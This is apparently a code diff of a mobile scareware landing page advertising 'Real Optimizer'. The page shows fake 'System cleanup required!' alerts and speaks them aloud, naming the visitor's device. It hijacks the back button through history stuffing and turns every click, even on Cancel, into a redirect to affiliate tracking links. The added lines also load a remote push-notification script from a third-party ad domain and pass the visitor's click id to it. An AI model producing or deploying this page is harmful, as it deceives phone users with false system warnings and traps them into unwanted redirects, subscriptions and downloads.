@@ -1,10 +1,5 @@
 <!DOCTYPE html><html><head>
   <base href="">
-
-  
-
-  
-
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style type="text/css">html {
@@ -608,12 +603,38 @@
         }
     </style>
 
-    <script>
-        function getURLParameter(name) {
-            return decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
-        }
-    </script>
+<script>
 
+    function contains(string, fragment) {
+        string = string.toLowerCase();
+        fragment = fragment.toLowerCase();
+        return string.indexOf(fragment) !== -1;
+    }
+
+    function getURLParameter(name) {
+        var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+
+        if(name.indexOf('brand') !== -1 && contains(result, 'generic')) {
+            result = 'Phone'
+        }
+
+        if(name.indexOf('model') !== -1 && contains(result, 'android')) {
+            result = 'Phone'
+        }
+
+        if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
+            result = 'Internet Browser'
+        }
+
+        if(result==null||result==""){
+            result = 'Phone'
+        }
+
+        return result;
+
+    }
+
+</script>
 
 <script type="text/javascript">
 function speak(text) {
@@ -628,7 +649,7 @@ msg.text = text;
 msg.lang = 'en-US';
 speechSynthesis.speak(msg);}
 
-speak('System cleanup required! Please click Install to install Real Optimizer for FREE and clean yours ' + getURLParameter("brand"));</script>
+speak('System cleanup required! Please click Install to install Real Optimizer for FREE and clean yours ' + getURLParameter("device_brand"));</script>
 
 <script type="text/javascript">
 function ready(callback){
@@ -640,49 +661,13 @@ function ready(callback){
 }
 
 ready(function(){
-    setTimeout(function() {alert('System cleanup required! Please click "Install" to install Real Optimizer for FREE and clean yours ' + getURLParameter("brand")) }, 300);
+    setTimeout(function() {alert('System cleanup required! Please click "Install" to install Real Optimizer for FREE and clean yours ' + getURLParameter("device_brand")) }, 300);
 });
 </script>
 
-<script>
-function getURLParameter(name) {
-return decodeURI(
-(RegExp(name + '=' + '(.*?)(&|$)').exec(location.search)||[,null])[1] || ''
-);
-}
-</script>
-
-<script type="text/javascript">
-    function goToPageIns() {
-        window.onbeforeunload = null;
-
-str0 = "http://";
-str1 = "trkmarket";
-str2 = "click";
-str3 = ".php";
-full=str0 + str1 + ".com/" + str2 + str3 + "?lp=1&place=Ins";
-
-
-        document.location.href = full;
-    }
-</script>
-<script type="text/javascript">
-    function goToPageCanc() {
-        window.onbeforeunload = null;
-
-str0 = "http://";
-str1 = "trkmarket";
-str2 = "click";
-str3 = ".php";
-full=str0 + str1 + ".com/" + str2 + str3 + "?lp=1&place=Canc";
-
-
-        document.location.href = full;
-    }
-</script>
 
 </head>
-<body class="en ltr" onclick="goto();">
+<body class="en ltr" onclick="ctaclick();">
 
 <div class="wrap">
     <div class="window">
@@ -690,25 +675,25 @@ full=str0 + str1 + ".com/" + str2 + str3 + "?lp=1&place=Canc";
 
 
             <h1 style="" class="blink_me">
-              Is <script>document.write(getURLParameter("brand"))</script>Samsung memory always insufficient?</h1>
+              Is <script>document.write(getURLParameter("device_brand"))</script> memory always insufficient?</h1>
             <p>
-               <script>document.write(getURLParameter("brand"))</script>Samsung <script>document.write(getURLParameter("model"))</script>SM-G530W can gain more space and stay faster.</p>
+               <script>document.write(getURLParameter("device_brand"))</script> can gain more space and stay faster.</p>
             <br>
             <p>
               Install the Real Optimizer! It has functions to accelerate, clean and protect your phone against all hazards.</p>
             <br>
-            <img src="icon.png" width="50" height="50" style="float: left; padding-right: 10px">
+            <img src="./icon.png" width="50" height="50" style="float: left; padding-right: 10px">
             <p>
               Click the button below and enjoy all the functions of Real Optimizer FREE.</p>
             <br>
 
         </div>
         <div class="buttons">
-            <a class="button exitpoint" href="javascript: goToPageIns()">
+            <a class="button exitpoint" onclick="ctaclick();">
 				<span> 
 																INSTALL							</span>
             </a>
-            <a class="button cancel" href="javascript: goToPageCanc();">
+            <a class="button cancel" onclick="ctaclick();">
 				<span>
 																CANCEL							</span>
             </a>
@@ -718,39 +703,9 @@ full=str0 + str1 + ".com/" + str2 + str3 + "?lp=1&place=Canc";
 </div>
 
 <audio autoplay="autoplay" preload="">
-    <source src="http://mobileprosmart.com/ZA/INS/RO/1/default.mp3" type="audio/mpeg">
-    <source src="http://mobileprosmart.com/ZA/INS/RO/1/default.ogg" type="audio/ogg">
+    <source src="./default.mp3" type="audio/mpeg">
+    <source src="./default.ogg" type="audio/ogg">
 </audio>
-
-
-<script type="text/javascript">(function (nv) {
-    nv.vibrate = nv.vibrate || nv.webkitVibrate || nv.mozVibrate || nv.msVibrate;
-    nv.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);
-})(navigator);</script>
-
-
-
-<script type="text/javascript">
-    function goto() {
-        window.onbeforeunload = null;
-
-str0 = "http://";
-str1 = "trkmarket";
-str2 = "click";
-str3 = ".php";
-full=str0 + str1 + ".com/" + str2 + str3 + "?lp=1&place=js";
-
-
-        document.location.href = full;
-    }
-</script>
-<script>
-(function(window) {
-if (window.location !== window.top.location) {
-window.top.location = window.location;
-}
-})(this);
-</script>
 
 <script type="text/javascript">
     !function () {
@@ -760,7 +715,7 @@ window.top.location = window.location;
             for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
             onpopstate = function (t) {
                 if(count%2 == 1) {
-                    alert('System cleanup required!\n\nPlease click \x22Install\x22 to install Real Optimizer for FREE and clean yours ' + getURLParameter("brand") + '!')
+                    alert('System cleanup required!\n\nPlease click \x22Install\x22 to install Real Optimizer for FREE and clean yours ' + getURLParameter("device_brand") + '!')
 
                 }
                 count++;
@@ -771,8 +726,36 @@ window.top.location = window.location;
     }();
 </script>
 
+<script>
+    function ctaclick(){
+      window.onbeforeunload = null;
+      window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
+      
+      setInterval(afflowsmartlink, 1000);
+    }
+    
+    function afflowsmartlink(){
+      location.replace("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2");
+    }
 
+</script>
 
+<script>
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+    var s = document.createElement('script');
+    s.src='//bigrourg.net/pfe/current/micro.tag.min.js?z=4978561'+'&ymid='+pci+'&sw=/sw-check-permissions-3b3e2.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+  </script>
 
 
 </body></html>
